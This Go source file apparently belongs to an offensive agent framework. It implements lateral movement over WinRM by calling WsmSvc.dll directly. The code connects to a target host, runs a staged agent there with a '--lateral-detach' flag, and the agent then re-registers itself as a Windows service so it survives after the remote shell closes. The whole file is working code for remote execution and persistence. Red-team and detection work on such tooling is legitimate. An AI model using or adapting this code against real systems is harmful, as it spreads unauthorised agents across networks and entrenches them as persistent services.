//go:build windows

package main

import (
	"errors"
	"fmt"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

// Native WinRM lateral execution through WsmSvc.dll (the WSMan client API
// that winrs.exe uses), replacing the winrs.exe subprocess. The remote
// command runs the staged agent with --lateral-detach so it re-registers
// itself as a local Windows service and exits: the WinRM shell kills its
// command process tree when the shell closes, while the SCM-started instance
// runs outside that job object and survives.

const (
	wsmanShellCmdURI       = "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd"
	wsmanCommandStateDone  = "/CommandState/Done"
	wsmanDataTypeBinary    = 2
	wsmanStreamReadLimit   = 128
	wsmanCompletionTimeout = 30 * time.Second
)

var (
	wsmSvcDll                = syscall.NewLazyDLL("WsmSvc.dll")
	procWSManInitialize      = wsmSvcDll.NewProc("WSManInitialize")
	procWSManDeinitialize    = wsmSvcDll.NewProc("WSManDeinitialize")
	procWSManCreateSession   = wsmSvcDll.NewProc("WSManCreateSession")
	procWSManCloseSession    = wsmSvcDll.NewProc("WSManCloseSession")
	procWSManCreateShell     = wsmSvcDll.NewProc("WSManCreateShell")
	procWSManCloseShell      = wsmSvcDll.NewProc("WSManCloseShell")
	procWSManRunShellCommand = wsmSvcDll.NewProc("WSManRunShellCommand")
	procWSManCloseCommand    = wsmSvcDll.NewProc("WSManCloseCommand")
	procWSManReceive         = wsmSvcDll.NewProc("WSManReceive")
)

// wsmanResult captures one asynchronous WSMan completion callback.
type wsmanResult struct {
	once  sync.Once
	done  chan struct{}
	flags uint32
	err   uintptr
	data  uintptr
}

func (r *wsmanResult) deliver(flags, err, data uintptr) {
	r.once.Do(func() {
		r.flags = uint32(flags)
		r.err = err
		r.data = data
		close(r.done)
	})
}

func (r *wsmanResult) wait(timeout time.Duration) bool {
	select {
	case <-r.done:
		return true
	case <-time.After(timeout):
		return false
	}
}

// wsmanCompletionCallback is the single completion sink; the async struct's
// operationContext carries the per-call result pointer.
var wsmanCompletionCallback = syscall.NewCallback(
	func(operation, flags, errPtr, asyncPtr, data uintptr) uintptr {
		if asyncPtr == 0 {
			return 0
		}
		context := *(*uintptr)(unsafe.Pointer(asyncPtr))
		if context != 0 {
			(*wsmanResult)(unsafe.Pointer(context)).deliver(flags, errPtr, data)
		}
		return 0
	},
)

// wsmanAsync returns the operationContext and completionFunction argument
// pair for the by-value WSMAN_SHELL_ASYNC parameter.
func wsmanAsync(result *wsmanResult) (uintptr, uintptr) {
	return uintptr(unsafe.Pointer(result)), wsmanCompletionCallback
}

func wsmanError(errPtr uintptr) error {
	if errPtr == 0 {
		return nil
	}
	code := *(*uint32)(unsafe.Pointer(errPtr))
	if code == 0 {
		return nil
	}
	return fmt.Errorf("WSMan error %d (0x%x)", code, code)
}

// readWSManString reads a bounded NUL-terminated UTF-16 string from native
// memory; it only runs on values expected to be command-state URIs.
func readWSManString(pointer uintptr) string {
	if pointer == 0 {
		return ""
	}
	runes := make([]uint16, 0, wsmanStreamReadLimit)
	for i := 0; i < wsmanStreamReadLimit; i++ {
		char := *(*uint16)(unsafe.Pointer(pointer + uintptr(i)*2))
		if char == 0 {
			break
		}
		runes = append(runes, char)
	}
	return syscall.UTF16ToString(runes)
}

// wsmanCommandDone inspects a WSMAN_STREAM_DATA completion for the command
// Done state and its exit code. Binary stream blocks are ignored.
func wsmanCommandDone(data uintptr) (bool, uint32) {
	if data == 0 {
		return false, 0
	}
	dataType := *(*uint32)(unsafe.Pointer(data))
	if dataType == wsmanDataTypeBinary {
		return false, 0
	}
	// WSMAN_STREAM_DATA { DWORD type; PCWSTR streamId; union { binaryData,
	// commandState } } — the command state string sits at offset 16.
	state := readWSManString(*(*uintptr)(unsafe.Pointer(data + 16)))
	if !strings.HasSuffix(state, wsmanCommandStateDone) {
		return false, 0
	}
	return true, *(*uint32)(unsafe.Pointer(data + 24))
}

// winrmCreateProcess runs the staged agent on the target through the native
// WSMan shell protocol. The command completes once the detach is done, so
// closing the shell cannot kill a still-running process.
func winrmCreateProcess(host, agentPath, sessionID string, workspaceID *string, serviceName string) error {
	arguments, err := lateralDetachArguments(sessionID, workspaceID, serviceName)
	if err != nil {
		return err
	}
	var api uintptr
	if hr, _, _ := procWSManInitialize.Call(0, uintptr(unsafe.Pointer(&api))); hr != 0 {
		return fmt.Errorf("WSManInitialize failed: 0x%08x", hr)
	}
	defer procWSManDeinitialize.Call(api, 0)
	connection, err := syscall.UTF16PtrFromString(fmt.Sprintf("http://%s:5985/wsman", host))
	if err != nil {
		return err
	}
	var session uintptr
	if hr, _, _ := procWSManCreateSession.Call(api, uintptr(unsafe.Pointer(connection)), 0,
		uintptr(unsafe.Pointer(&session))); hr != 0 {
		return fmt.Errorf("WSManCreateSession(%s) failed: 0x%08x", host, hr)
	}
	defer procWSManCloseSession.Call(session, 0)
	uri, err := syscall.UTF16PtrFromString(wsmanShellCmdURI)
	if err != nil {
		return err
	}
	shellResult := &wsmanResult{done: make(chan struct{})}
	var shell uintptr
	shellContext, shellCallback := wsmanAsync(shellResult)
	if hr, _, _ := procWSManCreateShell.Call(session, 0, uintptr(unsafe.Pointer(uri)), 0, 0,
		shellContext, shellCallback, uintptr(unsafe.Pointer(&shell))); hr != 0 {
		return fmt.Errorf("WSManCreateShell failed: 0x%08x", hr)
	}
	if !shellResult.wait(wsmanCompletionTimeout) {
		return errors.New("WinRM shell creation timed out")
	}
	if err := wsmanError(shellResult.err); err != nil {
		return fmt.Errorf("WinRM shell on %s: %w", host, err)
	}
	if shell == 0 {
		return errors.New("WSManCreateShell returned no shell handle")
	}
	defer procWSManCloseShell.Call(shell, 0, 0, 0)
	commandLine, err := syscall.UTF16PtrFromString(agentPath)
	if err != nil {
		return err
	}
	argumentPointers := make([]uintptr, 0, len(arguments)+1)
	for _, argument := range arguments {
		pointer, err := syscall.UTF16PtrFromString(argument)
		if err != nil {
			return err
		}
		argumentPointers = append(argumentPointers, uintptr(unsafe.Pointer(pointer)))
	}
	argumentPointers = append(argumentPointers, 0) // NULL-terminated array
	commandResult := &wsmanResult{done: make(chan struct{})}
	var command uintptr
	commandContext, commandCallback := wsmanAsync(commandResult)
	if hr, _, _ := procWSManRunShellCommand.Call(shell, 0, 0, uintptr(unsafe.Pointer(commandLine)),
		uintptr(unsafe.Pointer(&argumentPointers[0])), 0, commandContext, commandCallback,
		uintptr(unsafe.Pointer(&command))); hr != 0 {
		return fmt.Errorf("WSManRunShellCommand failed: 0x%08x", hr)
	}
	if !commandResult.wait(wsmanCompletionTimeout) {
		return errors.New("WinRM command creation timed out")
	}
	if err := wsmanError(commandResult.err); err != nil {
		return fmt.Errorf("WinRM command on %s: %w", host, err)
	}
	if command == 0 {
		return errors.New("WSManRunShellCommand returned no command handle")
	}
	defer procWSManCloseCommand.Call(command, 0, 0, 0)
	// Receive until the command reports the Done state so closing the shell
	// cannot kill a still-running detach.
	deadline := time.Now().Add(60 * time.Second)
	for {
		receiveResult := &wsmanResult{done: make(chan struct{})}
		streamID, err := syscall.UTF16PtrFromString("stdout")
		if err != nil {
			return err
		}
		receiveContext, receiveCallback := wsmanAsync(receiveResult)
		if hr, _, _ := procWSManReceive.Call(shell, command, 0, 0, uintptr(unsafe.Pointer(streamID)),
			receiveContext, receiveCallback); hr != 0 {
			return fmt.Errorf("WSManReceive failed: 0x%08x", hr)
		}
		if !receiveResult.wait(wsmanCompletionTimeout) {
			return errors.New("WinRM receive timed out; detach completion unconfirmed")
		}
		if err := wsmanError(receiveResult.err); err != nil {
			return fmt.Errorf("WinRM receive on %s: %w", host, err)
		}
		if done, exitCode := wsmanCommandDone(receiveResult.data); done {
			if exitCode != 0 {
				return fmt.Errorf("WinRM detach command exited with %d", exitCode)
			}
			return nil
		}
		if time.Now().After(deadline) {
			return errors.New("WinRM detach completion not confirmed within 60s")
		}
	}
}

// lateralDetachArguments builds the remote command arguments: the detach
// flag followed by the standard lateral startup arguments.
func lateralDetachArguments(sessionID string, workspaceID *string, serviceName string) ([]string, error) {
	args := []string{"--lateral-detach", "--lateral-session", sessionID}
	if workspaceID != nil {
		value := *workspaceID
		if value == "" {
			value = "-"
		}
		args = append(args, "--workspace-id", value)
	}
	if serviceName != "" {
		args = append(args, "--service-name", serviceName)
	}
	return args, nil
}
